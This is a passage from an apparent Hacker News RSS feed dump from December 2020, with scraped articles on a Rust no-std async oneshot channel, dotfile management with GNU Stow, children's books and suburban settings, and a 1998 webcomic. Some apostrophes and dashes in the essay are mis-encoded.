<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://refoundable.com/research/life-after-erooms-law-interview-with-jack-scannell.html">https://refoundable.com/research/life-after-erooms-law-interview-with-jack-scannell.html</a></em></p>]]>
            </description>
            <link>https://refoundable.com/research/life-after-erooms-law-interview-with-jack-scannell.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25549702</guid>
            <pubDate>Sun, 27 Dec 2020 08:29:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build your own async primitive]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25549549">thread link</a>) | @lukastyrychtr
<br/>
December 26, 2020 | https://tweedegolf.nl/blog/50/build-your-own-async-primitive | <a href="https://web.archive.org/web/*/https://tweedegolf.nl/blog/50/build-your-own-async-primitive">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Concurrency isn't easy and implementing its primitives is even harder. I found myself in need of
some no-std, no-alloc Rust async concurrency primitives and decided to write some. I kept the
scope small so even you and I can understand it. Even so, it still involved futures, wakers,
atomics, drop and unsafe. I'll introduce each of those to you while building a simple primitive.
At the end, even you will be able to implement your own primitives!</p><div><p>First, our primitive:</p><pre><code>//! A oneshot channel is a synchronization primitive used to send a single
//! message from one task to another. When the sender has sent a message and it
//! is ready to be received, the oneshot notifies the receiver. The receiver is
//! a Rust async `Future` that can be `await`ed. Our implementation does not
//! depend on std or alloc.
//!
//! See https://tweedegolf.nl/blog/50/build-your-own-async-primitive 
//! for a full description of the internals.</code></pre><p>What do we mean by all that? First, not depending on std or alloc means we can't use many
common libraries. Rust async is still a new area and the libraries so far depend on
allocating memory at least. That makes their primitives easier to build but also unusable on
embedded devices which can't afford an allocator. I work with such devices regularly and so I've
learned to avoid allocation whenever possible. We'll see that we can write our oneshot without
allocation just fine.</p><p>Next, we don't want to block the entire CPU while waiting for the message to be sent. For one
thing, it won't be sent if the CPU is blocked. When an operating system is available, it can
schedule the sending task while the receiving task is blocked and there's no problem. Small
embedded devices usually can't afford an operating system though, so you're left with
implementing task switching manually. That can involve a lot of moving state from your only call
stack into a struct and back so you can use the call stack to continue another task.</p><p>Rust async can do it for you: First, you choose an async executor to run your tasks. These
executors can be much simpler than even an embedded OS. Then you write your tasks as normal.
When you reach a point where you need to wait for another task to finish something, you just
write <code>.await</code>. The executor will store the state of your call stack and continue with a task
that isn't blocked. When the thing you were waiting for is done, the executor will wake your
task up again.</p><p>Let's begin with a <code>Oneshot</code> struct which will contain the data both the sender and receiver
need to access in order to transfer the message. It needs to be created high on the call stack
so it will outlive all tasks that might reference it. Then we create a <code>Sender</code> and <code>Receiver</code>
struct which contain a reference to the <code>Oneshot</code>. We can then give the sender to one task and
the receiver to another. Since they both have a reference to the <code>Oneshot</code>, they must be shared
references, which means we can't safely modify just anything inside. Instead, we need to use
types which are safe to modify through shared references.</p><h3 id="the-message">The message</h3><p>First, we need a way to transfer the message from the sender to the receiver. We could move it
directly if we wait for both the sender and receiver to be ready for the transfer: We'd know
where the data is on the sender side and where it should go on the receiver side. We call this
synchronous communication, both the sender and the receiver need to be ready before the
communication happens. It has its uses, but in this case, we don't want the sender to wait for
the receiver since it won't get a response back anyway. Instead, we'll store the message in the
<code>Oneshot</code> where it can wait for the receiver to be ready.</p><p>We don't want to restrict our oneshot to just one kind of message, so we'll generalize it over
the type of the message. We'll call that type <code>T</code>. When we create a new <code>Oneshot</code> we won't have
a message for it yet so we need to tell Rust we'll initialize it later. In Rust, you'd usually
use an <code>Option&lt;T&gt;</code> but we're going to track whether we have a <code>T</code> in a separate field so we'll
use a <code>MaybeUninit&lt;T&gt;</code> instead. Finally, we need to modify the field through a shared reference.</p><p>We'll store an <code>UnsafeCell&lt;MaybeUninit&lt;T&gt;&gt;</code> which allows us to modify the message through a
shared reference as long as we do so in a block of code marked as <code>unsafe</code>. An <code>unsafe</code> block
just means we make it our own responsibility to check the code is safe instead of the
compiler's. We need to do this whenever the safety logic is too complicated for the compiler to
understand.</p><h3 id="the-synchronization">The synchronization</h3><p>Next, we need to remember whether the message is ready to be received, or in other words,
whether the <code>message</code> field has been initialized. This is not as easy as it seems. Both
compilers and processors will reorder memory accesses in order to make your code run faster.
They'll make sure the code in a single task seems like it ran in the right order, but they won't
give the same guarantee for code running in different tasks. For example, if we had used an
<code>Option&lt;T&gt;</code> to store the message, the sender might turn it into a <code>Some()</code> first and store the
message afterwards. If the receiver happened to check in between, it would try to read a message
before there was ever stored one and it would end up with a bunch of garbage.</p><p>In order to make concurrent memory accesses safe, atomics were invented. We'll remember if we
have a message with an <code>AtomicBool</code>. Atomics make sure no task sees a partial update of the
atomic. The atomic either updates completely or not at all. On top of that, it also helps us
synchronize access to other memory: The value of the <code>AtomicBool</code> determines whether we allow
the sender or the receiver to access the message. That way, they never access it at the same
time.</p><p>Finally, we want to use Rust async/await to wait until the message is ready. This requires us to
store a waker. To be able to update the waker from a shared reference, we use the very nice
<code>AtomicWaker</code> from the <code>futures</code> library.</p><pre><code>use core::cell::UnsafeCell;
use core::mem::MaybeUninit;
use core::sync::atomic::{AtomicBool, Ordering};
use futures::task::AtomicWaker;

/// Transfer a single message between tasks using async/await.
pub struct Oneshot&lt;T&gt; {
    message: UnsafeCell&lt;MaybeUninit&lt;T&gt;&gt;,
    waker: AtomicWaker,
    has_message: AtomicBool,
}</code></pre><p>The <code>Sender</code> and <code>Receiver</code> are just thin wrappers around <code>Oneshot</code> references. They are generic
over both the type of the underlying message (<code>T</code>) and the lifetime of the reference (<code>'a</code>).
Wrapping the references in a struct allows us to name them and dictate what operations they
support.</p><pre><code>pub struct Sender&lt;'a, T&gt;(&amp;'a Oneshot&lt;T&gt;);
pub struct Receiver&lt;'a, T&gt;(&amp;'a Oneshot&lt;T&gt;);</code></pre><p>It may seem like we're not going very fast but choosing the right data representation is often
the hardest part of programming. From a good data representation, the implementation will follow
naturally. We begin with the <code>new</code> function which allows the creation of a new <code>Oneshot</code>. We
have no message yet so we don't initialize it and set <code>has_message</code> to false.</p><pre><code>impl&lt;T&gt; Oneshot&lt;T&gt; {
    pub const fn new() -&gt; Self {
        Self {
            message: UnsafeCell::new(MaybeUninit::uninit()),
            waker: AtomicWaker::new(),
            has_message: AtomicBool::new(false),
        }
    }</code></pre><h3 id="the-unsafe">The unsafe</h3><p>Next, we implement the most basic operations, putting a message in and taking it out again.
We'll get to synchronization later, so these will be unsafe functions. For performance
reasons, users may want to use these functions directly so we'll make them public. This is
fine as long as we document what properties must hold to use the function safely.</p><p>The <code>put</code> function will store a message. Since we're implementing a oneshot, we only expect
one communication so we assume there was no message before <code>put</code> gets called. This is a
property a user of this unsafe function must be told about!</p><p>As soon as we set <code>has_message</code> to true, the receiver may try to read the message so we must
make sure to write the message first. We also need to prevent the write of the message and
of <code>has_message</code> from being reordered. We do that by storing <code>has_message</code> with
<code>Ordering::Release</code>. This is a signal to the compiler that it must make sure any memory
accesses before it must be finished and visible to other cores.</p><p>Finally, we use the waker in order to schedule the receiving task to continue.</p><pre><code>    /// NOTE(unsafe): This function must not be used when the oneshot might
    /// contain a message or a `Sender` exists referencing this oneshot. This
    /// means it can't be used concurrently with itself or the latter to run
    /// will violate that constraint.
    pub unsafe fn put(&amp;self, message: T) {
        self.message.get().write(MaybeUninit::new(message));
        self.has_message.store(true, Ordering::Release);
        self.waker.wake();
    }</code></pre><p>The <code>take</code> function will check if a message is available yet and take it out of the oneshot
if it is. This time, we use <code>Ordering::Acquire</code> in order to ensure all memory accesses after
loading <code>has_message</code> really happen <strong>after</strong> it. For every synchronization between tasks, a
<code>Release</code>-<code>Acquire</code> pair is needed. Sometimes synchronization needs to go both ways and
<code>Ordering::AcqRel</code> can be used to get both effects.</p><p>When we're done taking the message, we <code>Release</code> its memory again by setting <code>has_message</code>
to <code>false</code>. If two instances of <code>take</code> run concurrently, they might both reach the message
read before setting <code>has_message</code> to <code>false</code> and thus duplicate the message so we need to
disallow that in the safety contract.</p><p>On the other hand, if it is run concurrently with <code>put</code>, according to the contract of <code>put</code>,
there must be no message beforehand. If <code>take</code> loads <code>has_message</code> first, it finds no
message and returns. If <code>put</code> writes <code>has_message</code> first, there is guaranteed to be a
message ready so <code>take</code> takes it without issue. Therefor, a single <code>take</code> can be safely run
concurrently with a single <code>put</code>. This is exactly what we need for a oneshot channel. We
never expect either function to run more than once but a single message can be transferred
between tasks ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tweedegolf.nl/blog/50/build-your-own-async-primitive">https://tweedegolf.nl/blog/50/build-your-own-async-primitive</a></em></p>]]>
            </description>
            <link>https://tweedegolf.nl/blog/50/build-your-own-async-primitive</link>
            <guid isPermaLink="false">hacker-news-small-sites-25549549</guid>
            <pubDate>Sun, 27 Dec 2020 07:43:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using GNU Stow to manage your dotfiles (2012)]]>
            </title>
            <description>
<![CDATA[
Score 174 | Comments 92 (<a href="https://news.ycombinator.com/item?id=25549462">thread link</a>) | @matthberg
<br/>
December 26, 2020 | http://brandon.invergo.net/news/2012-05-26-using-gnu-stow-to-manage-your-dotfiles.html | <a href="https://web.archive.org/web/*/http://brandon.invergo.net/news/2012-05-26-using-gnu-stow-to-manage-your-dotfiles.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	   

<p>I accidentally stumbled upon something yesterday that I felt like
sharing, which fell squarely into the "why the hell didn‚Äôt I know about this
before?" category. In this post, I‚Äôll describe how to manage
the various configuration files in your GNU/Linux home directory (aka
"dotfiles" like <code>.bashrc</code>) using GNU Stow.</p>

<p>The difficulty is that it would be helpful to manage one‚Äôs
configuration files with a version control system like Git, Mercurial
or Bazaar, but many/most dotfiles reside at the top-level of your home
directory, where it wouldn‚Äôt be a good idea to initialize a VCS
repository. Over time I‚Äôve come across various programs which aim to
manage this for you by keeping all the files in a subdirectory and
then installing or linking them into their appropriate places. None of
those programs ever really appealed to me.  They would require a ton
of dependencies (like Ruby and a ton of libraries for it) or they
would require me to remember how to use them, which is difficult when
really for such a task you rarely use the program.</p>

<p>Lately I‚Äôve been using <a href="http://www.gnu.org/software/stow">GNU Stow</a> to manage
programs I install from source to <code>/usr/local/</code>. Basically, in this typical
usage, you install locally built packages to
<code>/usr/local/stow/${PKGNAME}-{PKGVERSION}</code> and then from <code>/usr/local/stow/</code> you run
<code># stow ${PKGNAME}-${PKGVERSION}</code> and the program generates symbolic links to
all the programs' files into the appropriate places under <code>/usr/local/</code>. Then,
when you uninstall a program via Stow, you don‚Äôt have to worry about any stray
files that you or a provide Makefile may have missed. It also makes handling
alternate versions of a program quite easy (i.e. when I‚Äôm experimenting with
different configurations of <a href="http://dwm.suckless.org/">dwm</a> or
<a href="http://st.suckless.org/">st</a>).</p>

<p>Some time ago I happened across a mailing list posting where someone described
using Stow to manage the installation of their dotfiles. I didn‚Äôt pay much
attention to it but my brain must have filed it away for later. Yesterday I
decided to give it a try and I have to say that it is so much more convenient
than those other dedicated dotfile-management programs, even if it wasn‚Äôt an
immediately obvious option.</p>

<p>The procedure is simple. I created the <code>${HOME}/dotfiles</code> directory and then
inside it I made subdirectories for all the programs whose cofigurations I
wanted to manage. Inside each of those directories, I moved in all the
appropriate files, maintaining the directory structure of my home directory. So,
if a file normally resides at the top level of your home directory, it would go
into the top level of the program‚Äôs subdirectory. If a file normally goes in the
default <code>${XDG_CONFIG_HOME}/${PKGNAME}</code> location (<code>${HOME}/.config/${PKGNAME}</code>),
then it would instead go in <code>${HOME}/dotfiles/${PKGNAME}/.config/${PKGNAME}</code> and
so on. Finally, from the <code>dotfiles</code> directory, you just run <code>$ stow $PKGNAME</code>
and Stow will symlink all the package‚Äôs configuration files to the appropriate
locations. It‚Äôs then easy to make the <code>dotfiles</code> a VCS repository so you can
keep track of changes you make (plus it makes it so much easier to share
configurations between different computers, which was my main reason to do it).</p>

<p>For example, let‚Äôs say you want to manage the configuration for Bash, VIM and
Uzbl. Bash has a couple files in the top-level directory; VIM typically has your
.vimrc file on the top-level and a .vim directory; and Uzbl has files in
<code>${XDG_CONFIG_HOME}/uzbl</code> and <code>${XDG_DATA_HOME}/uzbl</code>. So, your home directory
looks like this:</p>

<pre><code>home/
    brandon/
        .config/
            uzbl/
                [...some files]
        .local/
            share/
                uzbl/
                    [...some files]
        .vim/
            [...some files]
        .bashrc
        .bash_profile
        .bash_logout
        .vimrc
</code></pre>

<p>You would then create a <code>dotfiles</code> subdirectory and move all the files there:</p>

<pre><code>home/
    /brandon/
        .config/
        .local/
            .share/
        dotfiles/
            bash/
                .bashrc
                .bash_profile
                .bash_logout
            uzbl/
                .config/
                    uzbl/
                        [...some files]
                .local/
                    share/
                        uzbl/
                            [...some files]
            vim/
                .vim/
                    [...some files]
                .vimrc
</code></pre>

<p>Then, perform the following commands:</p>

<pre><code>$ cd ~/dotfiles
$ stow bash
$ stow uzbl
$ stow vim
</code></pre>

<p>And, voila, all your config files (well, symbolic links to them) are
all in the correct place, however disorganized that might be, while
the actual files are all neatly organized in your <code>dotfiles</code>
directory, which is easily turned into a VCS repo. One handy thing is
that if you use multiple computers, which may not have the same
software installed on them, you can pick and choose which
configurations to install when you need them. All of your dotfiles are
always available in your <code>dotfiles</code> directory, but if you don‚Äôt need
the configuration for one program, you simply don‚Äôt Stow it and thus
it does not clutter your home directory.</p>

<p>Well, that‚Äôs all there is to it. Hopefully someone else out there
finds this useful! I know I‚Äôve found it to be a huge help.</p>

<p><a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/deed.en_US"><img alt="Creative Commons License" src="http://i.creativecommons.org/l/by-sa/3.0/88x31.png"></a><br><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">Using GNU Stow to Manage Your Dotfiles</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="http://brandon.invergo.net/" property="cc:attributionName" rel="cc:attributionURL">Brandon Invergo</a> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/deed.en_US">Creative Commons Attribution-ShareAlike 3.0 Unported License</a>.</p>


             
	   </article></div>]]>
            </description>
            <link>http://brandon.invergo.net/news/2012-05-26-using-gnu-stow-to-manage-your-dotfiles.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25549462</guid>
            <pubDate>Sun, 27 Dec 2020 07:19:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are there so few children‚Äôs books set in the suburbs?]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 67 (<a href="https://news.ycombinator.com/item?id=25549303">thread link</a>) | @krebs_liebhaber
<br/>
December 26, 2020 | https://psyche.co/ideas/why-you-wont-find-many-childrens-books-set-in-the-suburbs | <a href="https://web.archive.org/web/*/https://psyche.co/ideas/why-you-wont-find-many-childrens-books-set-in-the-suburbs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>Once upon a time,</strong> there were four little rabbits, and their names were Flopsy, Mopsy, Cottontail and Peter. They lived with their mother in a sandbank underneath the root of a very big fir tree. One day, their mother dropped them off at soccer practice and picked them up promptly afterward. When they got home, they all had bread and milk and blackberries.</p>
<p>That is roughly how the classic Beatrix Potter story from 1902 would go if it had been set in the American suburbs. But even if Potter hadn√¢‚Ç¨‚Ñ¢t set her books in England√¢‚Ç¨‚Ñ¢s Lake District, she would never have chosen a suburban setting. The suburbs kill the narrative adventure that is the lifeblood of children√¢‚Ç¨‚Ñ¢s literature.</p>
<p>Reading picture books to my children over the past 10 years, I√¢‚Ç¨‚Ñ¢ve noticed how many of the stories shun a suburban setting. This is no accident: the tales that most grip the imagination of children (and adults), with few exceptions, require rural or urban locations for their drama and vitality.</p>
<p>To simplify, the antithesis of North American suburbia is walkability, and picture books with literary merit love walkability. Compelling children√¢‚Ç¨‚Ñ¢s stories require that their characters are able to navigate their setting at a pedestrian scale and pace. For example, in the US author Arnold Lobel√¢‚Ç¨‚Ñ¢s classic stories of the 1970s, Frog and Toad never appear in a car, despite being thoroughly anthropomorphised. What most draws the reader into the stories are the adventures that the amphibians experience between their houses √¢‚Ç¨‚Äú in the meadow, the woods and the tall grass. They climb mountains and swim in ponds, but they also walk everywhere: to fly a kite, to buy ice-cream, to fulfil a to-do list.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1372/insert-Frog-and-Toad.jpg" alt="" title=""><figcaption>From <i>Adventures of Frog and Toad</i> by Arnold Lobel. <i>Image √Ç¬© the Estate of Arnold Lobel/Amazon</i></figcaption></figure></div><div>
<p>The plots of the Frances stories of the 1960s and √¢‚Ç¨‚Ñ¢70s written by Russell Hoban and illustrated by Lillian Hoban also revolve around walkability. Frances can walk to the general store and buy a tea set or a Chompo bar. Her trips on foot to her friends√¢‚Ç¨‚Ñ¢ houses frequently initiate narrative adventure. √¢‚Ç¨ÀúToday is my wandering day,√¢‚Ç¨‚Ñ¢ announces Frances√¢‚Ç¨‚Ñ¢s friend Albert, on which he likes to catch snakes, walk on fences and look for crow feathers. √¢‚Ç¨ÀúWandering days√¢‚Ç¨‚Ñ¢ in American suburbs, however, are infrequent or nearly impossible. Walkable environments preserve independence for the young, who are often the main characters in children√¢‚Ç¨‚Ñ¢s stories.</p>
<p>Both commutes are integral to the stories√¢‚Ç¨‚Ñ¢ plots, enabling shenanigans for the zoo animals</p>
<p>Consider George and Martha as yet another example. The only cars we see them in are the bumper cars at the amusement park. The US writer and illustrator James Marshall√¢‚Ç¨‚Ñ¢s beloved hippopotamuses of the 1970s and √¢‚Ç¨‚Ñ¢80s consistently engage meaningful, walkable destinations rather than sprawling subdivisions. They can hopscotch home after a visit to the store, comfort each other on their walk home from a scary movie, or push a bed to a picnic using roller skates.</p>
<p>In urban settings, walkability is closely <a href="https://transitcenter.org/wp-content/uploads/2016/07/Whos-On-Board-2016-7_12_2016.pdf" rel="nofollow noreferrer noopener">linked</a> to public transport, which is another narrative avenue for rich engagement with one√¢‚Ç¨‚Ñ¢s environment. Accordingly, the number of picture books that feature trains and buses is significantly greater than the number of trains and buses that most Americans experience. Yet I√¢‚Ç¨‚Ñ¢ve never seen a picture book that features a minivan or an SUV.</p>
<p>The zookeeper in Peggy Rathmann√¢‚Ç¨‚Ñ¢s <em>Good Night, Gorilla</em> (1994) lives within walking distance of the zoo. In Erin and Philip Stead√¢‚Ç¨‚Ñ¢s <em>A Sick Day for Amos McGee</em> (2011), the zookeeper takes the bus to work. Both commutes are integral to the stories√¢‚Ç¨‚Ñ¢ plots, enabling shenanigans for the zoo animals.</p>
<p>Besides public transport, urban settings give other ample opportunities for their characters to explore their immediate environment. Cities are where we√¢‚Ç¨‚Ñ¢re more likely to find civic places, such as zoos, libraries or concert venues. Cities tend to have more diverse kinds of people and more intergenerational <a href="https://www.gu.org/resources/all-in-together-creating-places-where-young-and-old-thrive/" rel="nofollow noreferrer noopener">activity</a> in both public and private places than in suburbia. Good picture books such as <em>Ben√¢‚Ç¨‚Ñ¢s Trumpet</em> (1979) by Rachel Isadora and <em>A Chair for My Mother</em> (1982) by Vera Williams exploit these opportunities in their stories.</p>
<p>It√¢‚Ç¨‚Ñ¢s one thing to find enviable walkability in Esphyr Slobodkina√¢‚Ç¨‚Ñ¢s <em>Caps for Sale</em> (1940) or Margaret and <span>H A Rey√¢‚Ç¨‚Ñ¢s</span> <em>Curious</em> <em>George</em> series (1941-66) or Ludwig Bemelmans√¢‚Ç¨‚Ñ¢s <em>Madeline</em> series (1939-61) √¢‚Ç¨‚Äú books written by European √É¬©migr√É¬©s to the US well before American housing developments and √¢‚Ç¨Àúbig box√¢‚Ç¨‚Ñ¢ stores became the dominant <a href="https://aeon.co/essays/step-by-step-americans-are-sacrificing-the-right-to-walk" rel="noopener">pattern</a> of land use in the mid-20th century. But to continue to find dynamic city living in bestsellers such as Bernard Waber√¢‚Ç¨‚Ñ¢s <em>The House on East 88th Street</em> (1962) or Mo Willems√¢‚Ç¨‚Ñ¢s <em>Knuffle</em> <em>Bunny</em> (2004) is revealing. (That both stories feature beautiful Victorian brownstones as their backdrop is a bonus.) Celebrated American children√¢‚Ç¨‚Ñ¢s books authors such as William Steig, the creator of Shrek, and Tomie dePaola consistently chose pre-modern settings for their stories, so the suburbs hardly even had a fighting chance.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1373/knufflebunny1.jpg" alt="" title=""><figcaption>From <i>Knuffle Bunny</i> (2004) by Mo Willems. <i>Courtesy Walker Books</i></figcaption></figure></div><div>
<p>More than any other works of fiction, picture books depend on their setting. When the automobile dominates the setting, the narrative dies faster than a trip down a cul-de-sac. Even when there are private modes of transportation in children√¢‚Ç¨‚Ñ¢s literature, they are ships, bicycles or hot-air balloons, where the transported are engaged with the world around them and the adventure or mystery that this world brings.</p>
<p>What we don√¢‚Ç¨‚Ñ¢t find in <em>Goodnight Moon</em> is the old lady driving her Chevy Suburban out of her subdivision to a Wal-Mart</p>
<p><strong>Of course, children√¢‚Ç¨‚Ñ¢s books</strong> are not marked exclusively by the narrative. The illustrations arguably play an even more important role. And there are multiple reasons, aside from the fact that the stories lack suburban settings, to avoid illustrations of the suburbs. One is that contemporary suburbs are often ugly. Another is that sprawl is hard to fit into a page. So, naturally, we don√¢‚Ç¨‚Ñ¢t find good children√¢‚Ç¨‚Ñ¢s books that feature pictures of √¢‚Ç¨Àúsnout houses√¢‚Ç¨‚Ñ¢ (with a garage that protrudes in front of the house, and typical of suburbs in the US and Canada), strip malls or parking lots. Instead, we find beautiful illustrations of the countryside and forest, such as in Jane Yolen√¢‚Ç¨‚Ñ¢s <em>Owl Moon</em> (1987) about a girl and her father who set out in the snow to look for an owl, or of the vibrant cityscape, as in Mordicai Gerstein√¢‚Ç¨‚Ñ¢s <em>The Man Who Walked Between the Towers</em> (2003) about Phillippe Petit√¢‚Ç¨‚Ñ¢s high-wire stunt in Manhattan, or the Paris of the <em>Madeline</em> stories.</p>
<p>Sometimes, the pictures display such stunningly beautiful and rich environments √¢‚Ç¨‚Äú such as in <em>The Mysteries of Harris Burdick</em> (1984) by Chris Van Allsburg, or <em>Sidewalk Flowers</em> (2015) by JonArno Lawson and Sydney Smith √¢‚Ç¨‚Äú that they carry the story with few or no words at all.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1376/insert-sidewalk-flowers.jpg" alt="" title=""><figcaption>From <i>Sidewalk Flowers</i> (2015) by JonArno Lawson and Sydney Smith. <i>Courtesy Walker Books</i></figcaption></figure></div><div>
<p>In a number of cases, the setting for a children√¢‚Ç¨‚Ñ¢s picture book isn√¢‚Ç¨‚Ñ¢t relevant to the argument I√¢‚Ç¨‚Ñ¢m making here because the setting has nothing do with the built environment or the natural environment. In some picture books (for example, Drew Daywalt√¢‚Ç¨‚Ñ¢s <em>The Day the Crayons Quit</em> (2013), illustrated by Oliver Jeffers) there√¢‚Ç¨‚Ñ¢s really no setting to speak of. In other cases, the setting is entirely indoors or entirely fantastical. It√¢‚Ç¨‚Ñ¢s not enough that a story takes place exclusively within a single-family home for it to count as suburban. Margaret Wise Brown and Clement Hurd√¢‚Ç¨‚Ñ¢s <em>Goodnight Moon</em> (1947) could well be suburban, but it also could be rural. What we don√¢‚Ç¨‚Ñ¢t find in <em>Goodnight Moon</em> is the old lady driving her Chevy Suburban out of her subdivision of single-family homes to a Wal-Mart for some sleeping pills.</p>
<p>It√¢‚Ç¨‚Ñ¢s true that some popular picture books do seem to have a suburban setting: Victoria Kann√¢‚Ç¨‚Ñ¢s <em>Pinkalicious</em> series (2006-), the <em>Berenstain Bears</em> series (1962-) by the Berenstain family, and Norman Bridwell√¢‚Ç¨‚Ñ¢s <em>Clifford the Big Red Dog</em> (1963-) come to mind. But these books also come to mind when I consider books I√¢‚Ç¨‚Ñ¢d rather burn than read √¢‚Ç¨‚Äú not because they take place in the suburbs but because they√¢‚Ç¨‚Ñ¢re so poorly written and illustrated. My only claim here is that <em>the best</em> children√¢‚Ç¨‚Ñ¢s books forgo suburbia.</p>
<p>There are, nevertheless, some exceptions to this rule. In Judith Viorst and Ray Cruz√¢‚Ç¨‚Ñ¢s classic 1972 picture book, for example, Alexander appears to be chauffeured around the suburbs by his mother; in that scenario, who wouldn√¢‚Ç¨‚Ñ¢t be having a terrible, horrible, no good, very bad day? But for every quality picture book that has a suburban setting, there are 100 that don√¢‚Ç¨‚Ñ¢t.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1375/inset-Town-Mouse-Country-Mouse-T9MMF4.jpg" alt="" title=""><figcaption>Illustration for Aesop√¢‚Ç¨‚Ñ¢s fable <i>The Town Mouse and the Country Mouse</i>. <i>Photo by Alamy</i></figcaption></figure></div><div>
<p>At least since Aesop√¢‚Ç¨‚Ñ¢s fable <em>The Town Mouse and the Country Mouse</em>, many children√¢‚Ç¨‚Ñ¢s stories exhibit a kind of anti-urban romanticism, of which Virginia Lee Burton√¢‚Ç¨‚Ñ¢s <em>The Little House</em> (1942) is one memorable example. Cities are dangerous and dirty places in contrast to the idyllic countryside. Books set in cities often react against this trend by showing the benefits of city life. Yet this counter-reaction is, arguably, guilty of romanticising the urban. Children√¢‚Ç¨‚Ñ¢s books that use pedestrian settings, whether urban or rural, fall prey to both kinds of romanticisation, displaying exclusively the attractiveness of a walkable town or a tranquil forest. However, the accuracy of these portrayals is not the point of the settings. Rather, their job is to serve the narrative and delight the reader.</p>
<p>Children√¢‚Ç¨‚Ñ¢s literature thrives on imaginative or surprising encounters, which need a geography that creates mischief and curiosity. But the suburbs, for all their benefits in real life, are places that in children√¢‚Ç¨‚Ñ¢s literature lack imagination, or at least don√¢‚Ç¨‚Ñ¢t provide suitable stage-sets for imaginative adventure and exploration: ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/ideas/why-you-wont-find-many-childrens-books-set-in-the-suburbs">https://psyche.co/ideas/why-you-wont-find-many-childrens-books-set-in-the-suburbs</a></em></p>]]>
            </description>
            <link>https://psyche.co/ideas/why-you-wont-find-many-childrens-books-set-in-the-suburbs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25549303</guid>
            <pubDate>Sun, 27 Dec 2020 06:29:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We rebuilt Corewars and used it to teach Computer Science students in India]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25549290">thread link</a>) | @aramachandran7
<br/>
December 26, 2020 | https://adinocap.com/blog/corewars-in-india/ | <a href="https://web.archive.org/web/*/https://adinocap.com/blog/corewars-in-india/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://adinocap.com/blog/corewars-in-india/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25549290</guid>
            <pubDate>Sun, 27 Dec 2020 06:26:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Guy I Almost Was (1998)]]>
            </title>
            <description>
<![CDATA[
Score 288 | Comments 182 (<a href="https://news.ycombinator.com/item?id=25549042">thread link</a>) | @wallflower
<br/>
December 26, 2020 | http://www.electricsheepcomix.com/almostguy/ | <a href="https://web.archive.org/web/*/http://www.electricsheepcomix.com/almostguy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		
		
		
			<li>
				<p><img src="http://www.electricsheepcomix.com/almostguy/images/title.png" width="556"> 
				</p>
				
			</li>
			
			<li>
				<div>
					<p>
						
					
						<h2>If This Van's a-Rockin' 
					<br>
						Don't Bother Knockin' </h2>
					</p>
				</div>
	
</li>
<li>
	<div>
		<h3>Friday Night, October 1978</h3>
	
			<p><img src="http://www.electricsheepcomix.com/almostguy/images/hulktime.gif" width="279" height="350"> 
</p></div>

</li>
<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/02.gif" width="377" height="350"> 
	</p>
	
</li>



<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/03.gif" width="396" height="350"> 
	</p>
	
</li>
<li>
	<p><img src="http://www.electricsheepcomix.com/almostguy/images/04.gif" width="466" height="310"> 
	</p>
	
</li>
<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/futuropolis_blue.gif" width="380"></p><p>
			This much I knew:
			<br>
				In the future, all cities would look like the one that appeared behind Kaptain Kool &amp; the Kongs on Saturday morning's <i>Krofft Supershow</i>. Bloated, curvaceous structures ‚Äî engineered by the same people who designed Corvette Stingrays and Yes album covers ‚Äî built out of shiny fiberglass, pristine chrome, and pulsating neon light -- Tomorrow's city would be a Space Age coral reef, teeming with millions of funky life forms, its limitless nooks and enclaves seething with parties, discos, arcades, and mind-blowing good times.... 
	</p>
</div>

</li>
<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/van_wide_color.gif" width="364" height="350"></p><p>
			My van would be more than just a mode of transportation... It would be my spaceship for navigating the Strip.
			<br>
				The Strip would eventually encompass the world. Domed cities would interconnect across continents , and hamster-tube highways would extend down into the ocean so that you could cruise the aquatic sea-cities. 
			<br>
				Your van could literally take you anywhere on Planet Earth. Maybe not as fast as a Concorde jet, but speed wasn't important. Getting there was all the fun.
	</p>
	
</div>

</li>
<li>
	<div>
		<p><img src="http://www.electricsheepcomix.com/almostguy/images/vandrive_red.gif"></p><div><p>
			What I would be doing for a living? I didn't care. According OMNI magazine, the technological changes of the 
			Eighties were going to be so <i>vast</i>, so <i>profound</i>, that the job market would be unrecognizable by the time I entered the workforce.
			</p><p>
			
